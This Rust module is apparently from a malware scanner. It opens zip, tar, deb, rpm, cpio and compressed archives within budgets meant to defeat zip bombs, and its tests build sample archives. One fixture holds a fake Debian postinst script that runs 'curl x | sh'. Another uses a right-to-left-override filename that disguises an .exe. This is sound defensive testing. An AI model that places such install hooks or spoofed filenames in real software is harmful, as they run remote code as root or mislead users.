//! Looking inside archives and packages.
//!
//! Malware rarely arrives as a bare executable: it comes zipped, as a
//! tarball, or inside a .deb/.rpm someone was talked into installing. Each
//! file inside is handed to the caller's visitor, which checks it like any
//! other file. Archives inside archives are opened too, up to a depth.
//!
//! Formats: zip (and everything built on it: jar, wheel, apk, vsix), tar,
//! deb (ar), rpm (cpio payload), and gzip/xz/bzip2/zstd streams around any of
//! them or around a single file. 7z, rar and AppImage (squashfs) are not
//! opened; ClamAV, when it runs, covers some of those.
//!
//! This parses attacker-controlled data in a root daemon, so:
//!   - only memory-safe (pure Rust) decoders are used;
//!   - everything is bounded: bytes decompressed in total (a zip bomb runs
//!     out of budget, not out of disk or memory), the size of one member held
//!     in memory, the number of members, the nesting depth, and wall-clock
//!     time. Running out of any of them ends the walk quietly: what was
//!     looked at so far still counts, and nothing is flagged for being big;
//!   - archives are streamed where the format allows (tar, cpio, compressed
//!     streams), so memory is one member at a time, not the unpacked whole.

use std::cell::Cell;
use std::io::{self, Cursor, Read};
use std::rc::Rc;
use std::time::{Duration, Instant};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Format {
    Zip,
    Tar,
    Deb,
    Rpm,
    Cpio,
    Gzip,
    Xz,
    Bzip2,
    Zstd,
}

impl Format {
    fn is_stream(self) -> bool {
        matches!(self, Format::Gzip | Format::Xz | Format::Bzip2 | Format::Zstd)
    }
}

/// Bytes a format can be recognised by; `detect` needs at most this many.
pub const DETECT_LEN: usize = 512;

/// Recognise an archive by its first bytes. Only formats with an
/// unambiguous signature are claimed; ar archives only when they are Debian
/// packages, so static libraries and Rust .rlib files (also ar) are left
/// alone.
pub fn detect(data: &[u8]) -> Option<Format> {
    let at = |off: usize, magic: &[u8]| data.get(off..off + magic.len()) == Some(magic);
    if at(0, b"PK\x03\x04") {
        Some(Format::Zip)
    } else if at(0, b"\x1f\x8b\x08") {
        Some(Format::Gzip)
    } else if at(0, b"\xfd7zXZ\x00") {
        Some(Format::Xz)
    } else if at(0, b"BZh") && data.get(3).is_some_and(|b| (b'1'..=b'9').contains(b)) && at(4, b"\x31\x41\x59\x26\x53\x59") {
        Some(Format::Bzip2)
    } else if at(0, b"\x28\xb5\x2f\xfd") {
        Some(Format::Zstd)
    } else if at(0, b"!<arch>\ndebian-binary") {
        Some(Format::Deb)
    } else if at(0, b"\xed\xab\xee\xdb") {
        Some(Format::Rpm)
    } else if at(0, b"070701") || at(0, b"070702") {
        Some(Format::Cpio)
    } else if at(257, b"ustar") {
        Some(Format::Tar)
    } else {
        None
    }
}

/// How far a walk may go.
#[derive(Debug, Clone, Copy)]
pub struct Limits {
    /// Largest member read into memory and checked; bigger ones are skipped.
    pub max_member: u64,
    /// Bytes decompressed over the whole walk, nested archives included.
    pub max_total: u64,
    pub max_members: u32,
    /// Archives opened inside archives. A .deb is two levels (the package,
    /// then data.tar.xz), its compressed tar counts as one.
    pub max_depth: u32,
    pub time: Duration,
}

impl Limits {
    /// Background checks of files as they are written.
    pub const ON_ACCESS: Limits = Limits {
        max_member: 32 << 20,
        max_total: 256 << 20,
        max_members: 20_000,
        max_depth: 4,
        time: Duration::from_secs(20),
    };
    /// Scans the user started, and rechecks.
    pub const ON_DEMAND: Limits = Limits {
        max_member: 48 << 20,
        max_total: 512 << 20,
        max_members: 50_000,
        max_depth: 5,
        time: Duration::from_secs(60),
    };
}

/// What a walk got through.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
pub struct Walked {
    /// Members handed to the visitor.
    pub members: u32,
    /// Members that couldn't be read: encrypted, an unsupported compression
    /// method, or over the size limit.
    pub skipped: u32,
    /// The walk stopped early on a limit or a damaged archive.
    pub incomplete: bool,
}

/// Whether to keep walking after a member.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Flow {
    Continue,
    Stop,
}

/// Walk the archive in `data` (named `name`, used to label the content of a
/// compressed single file), calling `visit(member path, bytes)` for every
/// regular file inside, nested archives included. Not an archive: nothing is
/// visited.
pub fn walk(data: &[u8], name: &str, limits: &Limits, visit: &mut dyn FnMut(&str, &[u8]) -> Flow) -> Walked {
    let Some(format) = detect(data) else { return Walked::default() };
    let mut w = Walker {
        limits: *limits,
        deadline: Instant::now() + limits.time,
        total: Rc::new(Cell::new(0)),
        out: Walked::default(),
        visit,
    };
    if let Err(e) = w.container(format, Source::Mem(data), "", name, 1) {
        if !is_marker::<Stop>(&e) {
            log::debug!("archive {name}: {e}");
            w.out.incomplete = true;
        }
    }
    w.out
}

/// Separator between the levels of a member path shown to the user.
pub const SEP: &str = " › ";

/// The visitor asked to stop. Carried up as an error, but never as
/// `ErrorKind::Interrupted`: std's read loops retry on that.
#[derive(Debug)]
struct Stop;

/// A walk limit was reached (budget, clock or member count).
#[derive(Debug)]
struct LimitHit(&'static str);

impl std::fmt::Display for Stop {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("stopped")
    }
}
impl std::error::Error for Stop {}

impl std::fmt::Display for LimitHit {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{} limit reached", self.0)
    }
}
impl std::error::Error for LimitHit {}

fn stopped() -> io::Error {
    io::Error::other(Stop)
}

fn limit(what: &'static str) -> io::Error {
    io::Error::other(LimitHit(what))
}

fn is_marker<T: std::error::Error + 'static>(e: &io::Error) -> bool {
    e.get_ref().is_some_and(|i| i.is::<T>())
}

/// Errors that end the whole walk rather than just one damaged member.
fn is_fatal(e: &io::Error) -> bool {
    is_marker::<Stop>(e) || is_marker::<LimitHit>(e)
}

enum Source<'a> {
    Mem(&'a [u8]),
    Stream(&'a mut dyn Read),
}

struct Walker<'v> {
    limits: Limits,
    deadline: Instant,
    total: Rc<Cell<u64>>,
    out: Walked,
    visit: &'v mut dyn FnMut(&str, &[u8]) -> Flow,
}

/// Counts every decompressed byte against the walk's budget and enforces the
/// deadline, on every read: a stream that expands without end hits the
/// budget inside the decoder's own read loop.
struct Metered<R> {
    inner: R,
    total: Rc<Cell<u64>>,
    max: u64,
    deadline: Instant,
}

impl<R: Read> Read for Metered<R> {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        if Instant::now() > self.deadline {
            return Err(limit("time"));
        }
        let n = self.inner.read(buf)?;
        let t = self.total.get() + n as u64;
        self.total.set(t);
        if t > self.max {
            return Err(limit("decompressed size"));
        }
        Ok(n)
    }
}

impl<'v> Walker<'v> {
    fn meter<R: Read>(&self, inner: R) -> Metered<R> {
        Metered { inner, total: self.total.clone(), max: self.limits.max_total, deadline: self.deadline }
    }

    /// Read one member into memory, or None (and drain it) if it's over the
    /// member limit.
    fn read_member(&mut self, r: &mut dyn Read, declared: Option<u64>) -> io::Result<Option<Vec<u8>>> {
        let max = self.limits.max_member;
        if declared.is_some_and(|d| d > max) {
            self.out.skipped += 1;
            return Ok(None);
        }
        let mut data = Vec::with_capacity(declared.unwrap_or(0).min(max) as usize);
        (&mut *r).take(max + 1).read_to_end(&mut data)?;
        if data.len() as u64 > max {
            io::copy(r, &mut io::sink())?;
            self.out.skipped += 1;
            return Ok(None);
        }
        Ok(Some(data))
    }

    /// Hand one member to the visitor, then open it if it's an archive.
    fn member(&mut self, path: &str, data: &[u8], depth: u32) -> io::Result<()> {
        if self.out.members >= self.limits.max_members {
            return Err(limit("member count"));
        }
        if Instant::now() > self.deadline {
            return Err(limit("time"));
        }
        self.out.members += 1;
        if (self.visit)(path, data) == Flow::Stop {
            return Err(stopped());
        }
        if let Some(format) = detect(data) {
            if depth < self.limits.max_depth {
                let name = path.rsplit(SEP).next().unwrap_or(path).to_string();
                self.container(format, Source::Mem(data), path, &name, depth + 1)?;
            } else {
                self.out.incomplete = true;
            }
        }
        Ok(())
    }

    /// Walk one container whose members are labelled under `prefix`.
    fn container(&mut self, format: Format, src: Source<'_>, prefix: &str, name: &str, depth: u32) -> io::Result<()> {
        match (format, src) {
            (Format::Zip, Source::Mem(data)) => self.zip(data, prefix, depth),
            (Format::Deb, Source::Mem(data)) => self.deb(data, prefix, depth),
            (Format::Rpm, Source::Mem(data)) => self.rpm(data, prefix, depth),
            (Format::Tar, Source::Mem(data)) => self.tar(&mut Cursor::new(data), prefix, depth),
            (Format::Tar, Source::Stream(r)) => self.tar(r, prefix, depth),
            (Format::Cpio, Source::Mem(data)) => self.cpio(&mut Cursor::new(data), prefix, depth),
            (Format::Cpio, Source::Stream(r)) => self.cpio(r, prefix, depth),
            (f, Source::Mem(data)) if f.is_stream() => self.stream(f, &mut Cursor::new(data), prefix, name, depth),
            (f, Source::Stream(r)) if f.is_stream() => self.stream(f, r, prefix, name, depth),
            // A random-access format met as a stream (a zip inside a .gz):
            // hold it in memory, within the member limit.
            (f, Source::Stream(r)) => match self.read_member(r, None)? {
                Some(data) => self.container(f, Source::Mem(&data), prefix, name, depth),
                None => Ok(()),
            },
            _ => Ok(()),
        }
    }

    /// A compressed stream. Its content is an archive (tar, cpio: walked as
    /// it streams), or a single file (labelled after the compressed file's
    /// name without the compression suffix).
    fn stream(&mut self, format: Format, raw: &mut dyn Read, prefix: &str, name: &str, depth: u32) -> io::Result<()> {
        const XZ_DICT_LIMIT_KB: u32 = 64 * 1024;
        const ZSTD_WINDOW_LIMIT: u64 = 64 << 20;
        let mut decoder: Box<dyn Read + '_> = match format {
            Format::Gzip => Box::new(flate2::read::MultiGzDecoder::new(raw)),
            Format::Xz => Box::new(lzma_rust2::XzReader::new_mem_limit(raw, true, XZ_DICT_LIMIT_KB)),
            Format::Bzip2 => Box::new(bzip2::read::MultiBzDecoder::new(raw)),
            Format::Zstd => Box::new(
                ruzstd::decoding::StreamingDecoder::new_with_max_window_size(raw, ZSTD_WINDOW_LIMIT)
                    .map_err(io::Error::other)?,
            ),
            _ => return Ok(()),
        };
        let mut plain = self.meter(&mut decoder);

        // Peek far enough to tell a tar from a single file.
        let mut head = Vec::with_capacity(DETECT_LEN);
        (&mut plain).take(DETECT_LEN as u64).read_to_end(&mut head)?;
        let inner = detect(&head).filter(|f| matches!(f, Format::Tar | Format::Cpio));
        let mut rest = Cursor::new(head).chain(plain);
        match inner {
            Some(f) if depth < self.limits.max_depth => {
                self.container(f, Source::Stream(&mut rest), prefix, name, depth + 1)
            }
            Some(_) => {
                self.out.incomplete = true;
                Ok(())
            }
            None => match self.read_member(&mut rest, None)? {
                Some(data) => {
                    let label = join(prefix, &strip_compression_suffix(name));
                    self.member(&label, &data, depth)
                }
                None => Ok(()),
            },
        }
    }

    fn zip(&mut self, data: &[u8], prefix: &str, depth: u32) -> io::Result<()> {
        let mut zip = zip::ZipArchive::new(Cursor::new(data)).map_err(io::Error::other)?;
        for i in 0..zip.len() {
            let mut entry = match zip.by_index(i) {
                Ok(e) => e,
                // Encrypted, or a compression method Qlam doesn't decode.
                Err(_) => {
                    self.out.skipped += 1;
                    continue;
                }
            };
            if !entry.is_file() {
                continue;
            }
            let path = join(prefix, &clean_name(entry.name_raw()));
            let declared = entry.size();
            let mut r = self.meter(&mut entry);
            match self.read_member(&mut r, Some(declared)) {
                Ok(Some(bytes)) => self.member(&path, &bytes, depth)?,
                Ok(None) => {}
                Err(e) if is_fatal(&e) => return Err(e),
                // A broken member (bad CRC, truncated): skip it, keep going.
                Err(_) => self.out.skipped += 1,
            }
        }
        Ok(())
    }

    fn tar(&mut self, r: &mut dyn Read, prefix: &str, depth: u32) -> io::Result<()> {
        let mut archive = tar::Archive::new(r);
        for entry in archive.entries()? {
            let mut entry = entry?;
            let kind = entry.header().entry_type();
            if !(kind.is_file() || kind.is_contiguous()) {
                continue;
            }
            let path = join(prefix, &clean_name(&entry.path_bytes()));
            let declared = entry.size();
            if let Some(bytes) = self.read_member(&mut entry, Some(declared))? {
                self.member(&path, &bytes, depth)?;
            }
        }
        Ok(())
    }

    /// Debian package: an ar archive of debian-binary, control.tar.* (the
    /// maintainer scripts run as root at install) and data.tar.* (the files).
    fn deb(&mut self, data: &[u8], prefix: &str, depth: u32) -> io::Result<()> {
        let mut off = 8; // "!<arch>\n"
        while off + 60 <= data.len() {
            let hdr = &data[off..off + 60];
            if &hdr[58..60] != b"`\n" {
                return Err(io::Error::other("bad ar header"));
            }
            let size: usize = std::str::from_utf8(&hdr[48..58])
                .ok()
                .and_then(|s| s.trim().parse().ok())
                .ok_or_else(|| io::Error::other("bad ar size"))?;
            let start = off + 60;
            let end = start.checked_add(size).filter(|e| *e <= data.len()).ok_or_else(|| io::Error::other("truncated ar"))?;
            let name = clean_name(&hdr[..16]);
            let name = name.trim_end().trim_end_matches('/');
            let body = &data[start..end];
            if name != "debian-binary" {
                if body.len() as u64 > self.limits.max_member {
                    self.out.skipped += 1;
                } else {
                    self.member(&join(prefix, name), body, depth)?;
                }
            }
            off = end + (size & 1); // members are 2-byte aligned
        }
        Ok(())
    }

    /// RPM: a lead, a signature header and the main header, then the
    /// payload, a compressed cpio archive.
    fn rpm(&mut self, data: &[u8], prefix: &str, depth: u32) -> io::Result<()> {
        let mut off = 96; // lead
        for pad in [true, false] {
            let h = data.get(off..off + 16).ok_or_else(|| io::Error::other("truncated rpm"))?;
            if h[..3] != [0x8e, 0xad, 0xe8] {
                return Err(io::Error::other("bad rpm header"));
            }
            let index = u32::from_be_bytes([h[8], h[9], h[10], h[11]]) as usize;
            let store = u32::from_be_bytes([h[12], h[13], h[14], h[15]]) as usize;
            if index > 1 << 16 || store > 1 << 28 {
                return Err(io::Error::other("rpm header too large"));
            }
            off += 16 + index * 16 + store;
            if pad {
                off = (off + 7) & !7; // the signature header is 8-byte aligned
            }
        }
        let payload = data.get(off..).ok_or_else(|| io::Error::other("truncated rpm"))?;
        match detect(payload) {
            Some(f) if f.is_stream() || f == Format::Cpio => self.container(f, Source::Mem(payload), prefix, "payload", depth),
            _ => Err(io::Error::other("unknown rpm payload")),
        }
    }

    /// cpio "newc" (070701) and "crc" (070702), as streamed.
    fn cpio(&mut self, r: &mut dyn Read, prefix: &str, depth: u32) -> io::Result<()> {
        fn skip(r: &mut dyn Read, n: u64, pos: &mut u64) -> io::Result<()> {
            let copied = io::copy(&mut r.take(n), &mut io::sink())?;
            *pos += copied;
            if copied == n { Ok(()) } else { Err(io::Error::new(io::ErrorKind::UnexpectedEof, "truncated cpio")) }
        }
        let mut pos: u64 = 0;
        loop {
            let mut hdr = [0u8; 110];
            r.read_exact(&mut hdr)?;
            pos += 110;
            if &hdr[..5] != b"07070" || !matches!(hdr[5], b'1' | b'2') {
                return Err(io::Error::other("bad cpio header"));
            }
            let field = |i: usize| -> io::Result<u64> {
                let s = std::str::from_utf8(&hdr[6 + i * 8..14 + i * 8]).map_err(io::Error::other)?;
                u64::from_str_radix(s, 16).map_err(io::Error::other)
            };
            let (mode, size, namesize) = (field(1)?, field(6)?, field(11)?);
            if namesize == 0 || namesize > 4096 {
                return Err(io::Error::other("bad cpio name"));
            }
            let mut name = vec![0u8; namesize as usize];
            r.read_exact(&mut name)?;
            pos += namesize;
            skip(r, pos.next_multiple_of(4) - pos, &mut pos)?;
            name.pop(); // NUL
            if name == b"TRAILER!!!" {
                return Ok(());
            }
            if mode & 0o170000 == 0o100000 && size > 0 {
                let path = join(prefix, &clean_name(&name));
                let mut body = (&mut *r).take(size);
                let member = self.read_member(&mut body, Some(size));
                let left = body.limit();
                pos += size - left;
                if left > 0 {
                    skip(r, left, &mut pos)?;
                }
                if let Some(bytes) = member? {
                    self.member(&path, &bytes, depth)?;
                }
            } else {
                skip(r, size, &mut pos)?;
            }
            skip(r, pos.next_multiple_of(4) - pos, &mut pos)?;
        }
    }
}

fn join(prefix: &str, name: &str) -> String {
    if prefix.is_empty() { name.to_string() } else { format!("{prefix}{SEP}{name}") }
}

/// Member names come from the archive, i.e. from whoever made it, and end
/// up in notifications and the app: keep them printable, free of markup and
/// of a sane length.
pub fn clean_name(raw: &[u8]) -> String {
    let s = String::from_utf8_lossy(raw);
    let s = s.trim_start_matches("./");
    let mut out: String = s
        .chars()
        .map(|c| if c.is_control() || matches!(c, '<' | '>' | '&' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}') { '_' } else { c })
        .collect();
    if out.chars().count() > 160 {
        let tail: String = out.chars().rev().take(150).collect::<Vec<_>>().into_iter().rev().collect();
        out = format!("…{tail}");
    }
    if out.is_empty() { "(unnamed)".into() } else { out }
}

fn strip_compression_suffix(name: &str) -> String {
    let lower = name.to_ascii_lowercase();
    for (suffix, replace) in [(".tgz", ".tar"), (".gz", ""), (".xz", ""), (".bz2", ""), (".zst", ""), (".zstd", "")] {
        if lower.ends_with(suffix) && name.len() > suffix.len() {
            return format!("{}{replace}", &name[..name.len() - suffix.len()]);
        }
    }
    if name.is_empty() { "(compressed content)".into() } else { format!("{name} (decompressed)") }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn collect(data: &[u8], name: &str, limits: &Limits) -> (Vec<(String, Vec<u8>)>, Walked) {
        let mut seen = Vec::new();
        let walked = walk(data, name, limits, &mut |p, d| {
            seen.push((p.to_string(), d.to_vec()));
            Flow::Continue
        });
        (seen, walked)
    }

    fn tar_of(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut b = tar::Builder::new(Vec::new());
        for (name, data) in files {
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(0o755);
            h.set_entry_type(tar::EntryType::Regular);
            b.append_data(&mut h, name, *data).unwrap();
        }
        b.into_inner().unwrap()
    }

    fn zip_of(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
        for (name, data) in files {
            w.start_file(*name, zip::write::SimpleFileOptions::default()).unwrap();
            w.write_all(data).unwrap();
        }
        w.finish().unwrap().into_inner()
    }

    fn gzip(data: &[u8]) -> Vec<u8> {
        let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        e.write_all(data).unwrap();
        e.finish().unwrap()
    }

    fn xz(data: &[u8]) -> Vec<u8> {
        let mut w = lzma_rust2::XzWriter::new(Vec::new(), lzma_rust2::XzOptions::default()).unwrap();
        w.write_all(data).unwrap();
        w.finish().unwrap()
    }

    fn bz2(data: &[u8]) -> Vec<u8> {
        let mut e = bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::fast());
        e.write_all(data).unwrap();
        e.finish().unwrap()
    }

    fn ar_member(out: &mut Vec<u8>, name: &str, data: &[u8]) {
        out.extend_from_slice(format!("{name:<16}{:<12}{:<6}{:<6}{:<8}{:<10}`\n", 0, 0, 0, 100644, data.len()).as_bytes());
        out.extend_from_slice(data);
        if data.len() % 2 == 1 {
            out.push(b'\n');
        }
    }

    fn cpio_of(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        let mut entry = |name: &str, mode: u32, data: &[u8]| {
            let namesize = name.len() + 1;
            out.extend_from_slice(
                format!("070701{:08x}{mode:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{namesize:08x}{:08x}", 1, 0, 0, 1, 0, data.len(), 0, 0, 0, 0, 0)
                    .as_bytes(),
            );
            out.extend_from_slice(name.as_bytes());
            out.push(0);
            while out.len() % 4 != 0 {
                out.push(0);
            }
            out.extend_from_slice(data);
            while out.len() % 4 != 0 {
                out.push(0);
            }
        };
        for (name, data) in files {
            entry(name, 0o100755, data);
        }
        entry("TRAILER!!!", 0, b"");
        out
    }

    #[test]
    fn detects_formats() {
        assert_eq!(detect(&zip_of(&[("a", b"x")])), Some(Format::Zip));
        assert_eq!(detect(&tar_of(&[("a", b"x")])), Some(Format::Tar));
        assert_eq!(detect(&gzip(b"x")), Some(Format::Gzip));
        assert_eq!(detect(&xz(b"x")), Some(Format::Xz));
        assert_eq!(detect(&bz2(b"x")), Some(Format::Bzip2));
        assert_eq!(detect(b"!<arch>\ndebian-binary   1"), Some(Format::Deb));
        // A static library or .rlib is ar too, but not a package.
        assert_eq!(detect(b"!<arch>\nlib.rmeta/      0"), None);
        assert_eq!(detect(b"\x7fELF\x02\x01\x01"), None);
        assert_eq!(detect(b"BZh9 not really"), None);
    }

    #[test]
    fn walks_nested_tarball_in_zip() {
        let tgz = gzip(&tar_of(&[("bin/bot", b"\x7fELF payload"), ("README", b"hello")]));
        let z = zip_of(&[("release/bot.tar.gz", &tgz), ("notes.txt", b"n")]);
        let (seen, w) = collect(&z, "dl.zip", &Limits::ON_DEMAND);
        let names: Vec<&str> = seen.iter().map(|(n, _)| n.as_str()).collect();
        assert_eq!(names, ["release/bot.tar.gz", "release/bot.tar.gz › bin/bot", "release/bot.tar.gz › README", "notes.txt"]);
        assert_eq!(seen[1].1, b"\x7fELF payload");
        assert!(!w.incomplete);
    }

    #[test]
    fn compressed_single_file_is_named_after_the_file() {
        let (seen, _) = collect(&xz(b"#!/bin/sh\necho hi\n"), "install.sh.xz", &Limits::ON_DEMAND);
        assert_eq!(seen, [("install.sh".to_string(), b"#!/bin/sh\necho hi\n".to_vec())]);
        let (seen, _) = collect(&bz2(b"data"), "x.bz2", &Limits::ON_DEMAND);
        assert_eq!(seen[0].0, "x");
    }

    #[test]
    fn walks_deb_control_and_data() {
        let control = gzip(&tar_of(&[("./postinst", b"#!/bin/sh\ncurl x | sh\n")]));
        let data = xz(&tar_of(&[("./usr/bin/tool", b"\x7fELF tool")]));
        let mut deb = b"!<arch>\n".to_vec();
        ar_member(&mut deb, "debian-binary", b"2.0\n");
        ar_member(&mut deb, "control.tar.gz", &control);
        ar_member(&mut deb, "data.tar.xz", &data);
        let (seen, w) = collect(&deb, "pkg.deb", &Limits::ON_DEMAND);
        let names: Vec<&str> = seen.iter().map(|(n, _)| n.as_str()).collect();
        assert!(names.contains(&"control.tar.gz › postinst"), "{names:?}");
        assert!(names.contains(&"data.tar.xz › usr/bin/tool"), "{names:?}");
        assert!(!w.incomplete, "{w:?}");
    }

    #[test]
    fn walks_rpm_payload() {
        let mut rpm = vec![0xed, 0xab, 0xee, 0xdb];
        rpm.resize(96, 0);
        for (index, store) in [(1u32, 5u32), (2, 3)] {
            rpm.extend_from_slice(&[0x8e, 0xad, 0xe8, 0x01, 0, 0, 0, 0]);
            rpm.extend_from_slice(&index.to_be_bytes());
            rpm.extend_from_slice(&store.to_be_bytes());
            rpm.resize(rpm.len() + index as usize * 16 + store as usize, 0);
            if index == 1 {
                rpm.resize(rpm.len().next_multiple_of(8), 0);
            }
        }
        rpm.extend_from_slice(&gzip(&cpio_of(&[("./usr/bin/a", b"\x7fELF a"), ("./etc/b.conf", b"odd")])));
        let (seen, w) = collect(&rpm, "p.rpm", &Limits::ON_DEMAND);
        assert_eq!(seen.iter().map(|(n, _)| n.as_str()).collect::<Vec<_>>(), ["usr/bin/a", "etc/b.conf"]);
        assert_eq!(seen[1].1, b"odd");
        assert!(!w.incomplete, "{w:?}");
    }

    #[test]
    fn bombs_run_out_of_budget() {
        // 64 MB of zeros compresses to ~64 KB.
        let zeros = vec![0u8; 64 << 20];
        let bomb = gzip(&zeros);
        let small = Limits { max_total: 8 << 20, ..Limits::ON_ACCESS };
        let (seen, w) = collect(&bomb, "z.gz", &small);
        assert!(seen.is_empty());
        assert!(w.incomplete);
        // Over the member limit: skipped, not flagged, not held in memory.
        let tight = Limits { max_member: 1 << 20, ..Limits::ON_DEMAND };
        let (seen, w) = collect(&zip_of(&[("big", &zeros[..4 << 20]), ("small", b"s")]), "b.zip", &tight);
        assert_eq!(seen.len(), 1);
        assert_eq!(w.skipped, 1);
    }

    #[test]
    fn nesting_is_bounded() {
        let mut data = zip_of(&[("core", b"x")]);
        for i in 0..6 {
            data = zip_of(&[(&format!("level{i}.zip"), &data)]);
        }
        let (seen, w) = collect(&data, "deep.zip", &Limits::ON_ACCESS);
        assert_eq!(seen.len(), Limits::ON_ACCESS.max_depth as usize);
        assert!(w.incomplete);
    }

    #[test]
    fn stop_ends_the_walk() {
        let z = zip_of(&[("a", b"1"), ("b", b"2"), ("c", b"3")]);
        let mut n = 0;
        let w = walk(&z, "z.zip", &Limits::ON_DEMAND, &mut |_, _| {
            n += 1;
            if n == 2 { Flow::Stop } else { Flow::Continue }
        });
        assert_eq!(n, 2);
        assert!(!w.incomplete);
    }

    #[test]
    fn garbage_is_survived() {
        for bad in [&b"PK\x03\x04garbage"[..], b"\x1f\x8b\x08garbage", b"\xfd7zXZ\x00garbage", b"!<arch>\ndebian-binary   9999999999`\n"] {
            let (seen, _) = collect(bad, "bad", &Limits::ON_DEMAND);
            assert!(seen.is_empty());
        }
        let mut truncated = gzip(&tar_of(&[("a", &[7u8; 5000])]));
        truncated.truncate(truncated.len() / 2);
        let _ = collect(&truncated, "t.tgz", &Limits::ON_DEMAND);
    }

    #[test]
    fn names_are_made_safe() {
        assert_eq!(clean_name(b"./a/<b>\x1b[31m.sh"), "a/_b__[31m.sh");
        assert_eq!(clean_name("evil\u{202e}hs.exe".as_bytes()), "evil_hs.exe");
        assert!(clean_name(&[b'x'; 500]).chars().count() <= 151);
    }
}
